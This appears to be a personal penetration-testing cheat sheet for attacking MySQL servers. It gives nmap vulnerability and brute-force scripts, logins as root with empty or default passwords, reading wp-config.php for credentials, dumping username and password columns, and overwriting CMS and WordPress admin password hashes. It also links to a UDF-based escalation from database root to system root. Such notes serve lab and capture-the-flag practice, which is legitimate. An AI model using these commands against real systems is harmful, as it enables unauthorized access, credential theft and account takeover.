#### nmap
```bash - kali
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse $TARGET -p 3306
```

#### wp-config.php file
```bash - kali
cat wp-config.php
```

#### Remote login
```bash - kali
mysql --host=$TARGET -u root -P 3306 -p
```

#### Local login
```bash - kali
mysql -h localhost -u root -P 3306 -p
```

#### passwords
Try with empty password or:

```bash - kali
root
```

or brute:

![[Hydra#Hydra against MySQL]]

```SQL
show databases;
```

```SQL
use <DATABASE>;
```

```SQL
show tables;
```

```SQL
describe <TABLE>;
```

```SQL
select * from <TABLE>;
```

or

```SQL
select usernames,passwords from <TABLE>;
```

![[Pasted image 20220126101801.png]]

#### Change password
```SQL
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin';
```

**cms_siteprefs would be found under show tables;**

![[Pasted image 20220126102546.png]]

or

```bash - kali
echo -n 'admin' | md5sum
```

==21232f297a57a5a743894a0e4a801fc3==

```SQL
update cms_users SET password='21232f297a57a5a743894a0e4a801fc3' WHERE username='admin';
```

![[Pasted image 20220126101821.png]]

#### MYSQL UDF 4.x/5.0
[https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

```bash - kali
nmap --script=mysql-brute $TARGET
```

```bash - kali
mysql -u username -h $TARGET -p
```

```bash - kali
mysql --host=127.0.0.1 --port=13306 --user=wp -p
```

#### MySQL to Wordpress password

```bash - kali
mysql -u root -h $TARGET -p
```

Try with empty password, also try with password:

```bash - kali
root
```

```bash - kali
select * from users
```

```bash - kali
UPDATE 'users' SET 'pass'=MD5('password') WHERE 'user_login' = 'admin';
```
